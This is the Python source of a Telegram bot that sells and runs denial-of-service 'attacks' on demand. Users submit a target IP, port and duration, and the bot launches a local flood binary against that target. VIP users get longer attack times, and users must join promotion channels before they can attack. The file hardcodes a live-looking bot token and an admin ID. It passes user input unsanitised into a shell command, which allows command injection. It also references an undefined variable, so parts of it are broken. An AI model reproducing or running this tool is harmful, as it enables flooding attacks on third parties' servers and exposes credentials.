import telebot
import subprocess
import random
import os
import threading
import logging
from telebot.types import ChatMember
from PIL import Image

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[
    logging.StreamHandler(),  # Logs to console
    logging.FileHandler('bot_log.txt', mode='a')  # Logs to a file
])
logger = logging.getLogger()

# Your Telegram bot token
bot = telebot.TeleBot('7753887004:AAEI1cyCo3waGLMIS1rw3zo0_vzTrAKhBHA')

# Admin ID
ADMINS = {5968988297}

# VIP Users
vip_users = set()

# Attack settings
MAX_ATTACK_TIME = 120
VIP_ATTACK_TIME = 240
paradox_PATH = "./smokey"

# Blocked ports
BLOCKED_PORTS = {21, 22, 80, 443, 3306, 8700, 20000, 443, 17500, 9031, 20002, 20001}  # Example blocked ports

# Attack status tracking
attack_lock = threading.Lock()
active_attacker = None
feedback_required = None
active_attacks = 0  # Tracks the number of concurrent attacks
max_concurrent_attacks = 2  # Default max concurrent attacks

# ✅ Required channels to join
REQUIRED_CHANNELS = [
    "KapilYadavFreeService",  # without @
    "toxicvipgroup12"
]

# Helper to check if user is joined in all required channels
def is_user_joined_all(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            member = bot.get_chat_member(f"@{channel}", user_id)
            if member.status in ['left', 'kicked']:
                return False
        except:
            return False
    return True

# Add VIP user
@bot.message_handler(commands=['vipuser'])
def add_vip(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "🛑 *Uh-oh!* Only the *Supreme Admin* can grant VIP powers. 🦸‍♂️")
        return
    
    try:
        user_id = int(message.text.split()[1])
        vip_users.add(user_id)
        bot.reply_to(message, f"🎉 *Success!* The mighty user `{user_id}` is now a VIP! 🏅")
    except:
        bot.reply_to(message, "⚠️ *Error!* Make sure you use the command correctly: `/vipuser <user_id>` 📝")

# Remove VIP user
@bot.message_handler(commands=['unvipuser'])
def remove_vip(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "🛑 *Whoa!* Only the *Admin Supreme* can remove VIP status. ⚡")
        return
    
    try:
        user_id = int(message.text.split()[1])
        vip_users.discard(user_id)
        bot.reply_to(message, f"💨 *Poof!* User `{user_id}` is no longer a VIP. ✨")
    except:
        bot.reply_to(message, "⚠️ *Oops!* Use `/unvipuser <user_id>` to properly remove VIP status. 📝")

# Set max concurrent attacks (admin only)
@bot.message_handler(commands=['setmax'])
def set_max_concurrent(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "🚫 *Hold up!* Only *admins* have the *power* to set the max attacks. ⚔️")
        return
    
    try:
        max_attacks = int(message.text.split()[1])
        global max_concurrent_attacks
        if max_attacks < 3:
            bot.reply_to(message, "⚠️ *Wait!* You can’t have less than 3 concurrent attack. Try again! 🔄")
            return
        max_concurrent_attacks = max_attacks
        bot.reply_to(message, f"💥 *Power unleashed!* Max concurrent attacks set to *{max_concurrent_attacks}*! 🚀")
    except:
        bot.reply_to(message, "⚠️ *Oops!* Use `/setmax <number_of_attacks>` to properly set it. 📝")

# Broadcast message to all users who interacted with the bot
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "🛑 *Hold your horses!* Only *admin* can broadcast a message. 🚫")
        return
    
    # Extract the message text (after the command)
    broadcast_text = message.text[len('/broadcast '):]
    if not broadcast_text:
        bot.reply_to(message, "⚠️ *Oops!* You forgot to add a message to broadcast! 📩")
        return
    
    # Send the message to all users who interacted with the bot
    for user_id in users_interacted:
        try:
            bot.send_message(user_id, broadcast_text)
        except Exception as e:
            logger.error(f"Error broadcasting to {user_id}: {e}")

    bot.reply_to(message, f"📣 *Broadcast complete!* Your message has been sent to *{len(users_interacted)}* users! 🎯")

# Help Command
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "🔮 *I am your bot wizard!* Here's what I can do for you:\n\n"
        "/vipuser <user_id> - *Give someone VIP powers* 🌟\n"
        "/unvipuser <user_id> - *Remove VIP status* 👋\n"
        "/setmax <number_of_attacks> - *Set max attacks limit* 🚧\n"
        "/broadcast <message> - *Send a broadcast to everyone* 🌍\n"
        "/attack <IP> <PORT> <TIME> - *Start an epic attack* ⚔️\n"
        "/help - *Get this magical help menu* 🧙‍♂️\n\n"
        "⚠️ *Be careful* and use your powers wisely! I'm here to help. 💡"
    )
    bot.reply_to(message, help_text)

# Command to start attack
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global active_attacker, feedback_required, active_attacks
    user_id = message.from_user.id

    # 🚫 Block if not joined all required channels
    if not is_user_joined_all(user_id):
        join_links = "\n".join([f"👉 *Join* @{ch} [Here](https://t.me/{ch})" for ch in REQUIRED_CHANNELS])
        bot.reply_to(message, f"🚫 *Hold on!* You need to join all the required channels first! 📡\n\n{join_links}")
        return

    # 🚫 Block if maximum number of concurrent attacks is reached
    if active_attacks >= max_concurrent_attacks:
        bot.reply_to(message, "⏳ *Please wait!* Too many attacks in progress. Try again soon! 💨")
        return

    if active_attacker:
        bot.reply_to(message, "⏳ *Just a sec...* An attack is already in progress. Patience is key! ⏱️")
        return

    if feedback_required and feedback_required == user_id:
        bot.reply_to(message, "📸 *Feedback time!* Send your feedback before launching another attack! 📝")
        return

    # Register the user as interacted
    users_interacted.add(user_id)

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠️ *Oops!* I need a bit more info: `/attack <ip> <Port> <time>` 🖥️")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
        if port in BLOCKED_PORTS:
            bot.reply_to(message, f"🚫 *Sorry!* Port `{port}` is blocked for attacks! 🔒")
            return
        max_time = VIP_ATTACK_TIME if user_id in vip_users else MAX_ATTACK_TIME
        if time_duration > max_time:
            bot.reply_to(message, f"⚠️ *Hold up!* Max time is {max_time}s. Try again! ⏳")
            return
    except ValueError:
        bot.reply_to(message, "⚠️ *Whoops!* Port and Time must be *numbers*. Try again! 🧮")
        return

    if not os.path.exists(paradox_PATH):
        bot.reply_to(message, "❌ *Error!* `paradox` executable is missing. Can't proceed. 🧐")
        return

    if not os.access(paradox_PATH, os.X_OK):
        os.chmod(paradox_PATH, 0o755)

    bot.reply_to(message, f"⚡ *Attack INITIATED!* 💥\n*Target:* `{target}:{port}`\n⏳ *Duration:* `{time_duration}s`\n🔥 *Status:* `Engines at full power!` 🚀\n\n🔒 The countdown has begun—prepare for impact! 💥")
    
    active_attacker = user_id
    active_attacks += 1  # Increment active attacks

    # Logging attack start
    logger.info(f"Attack started by {user_id} on {target}:{port} for {time_duration} seconds.")

    def run_attack():
        global active_attacker, feedback_required, active_attacks
        try:
            full_command = f"{paradox_PATH} {target} {port} {time_duration} 600"
            subprocess.run(full_command, shell=True, capture_output=True, text=True)
        finally:
            feedback_required = user_id
            active_attacker = None
            active_attacks -= 1  # Decrement active attacks
            bot.reply_to(message, f"✅ *Attack FINISHED!* 🎯\n*Target:* `{target}:{port}`\n⏱️ *Duration:* `{time_duration}s`\n⚡ *Status:* `Mission accomplished—impact confirmed!`\n\n🎬 *Mission complete!* Send feedback and get ready for the next strike! 💪")
            
            # Logging attack finish
            logger.info(f"Attack finished by {user_id} on {target}:{port}. Duration: {time_duration}s")

    threading.Thread(target=run_attack, daemon=True).start()

# Start polling and log bot start
logger.info("Bot has started successfully and is now listening for commands...")

bot.polling(none_stop=True)
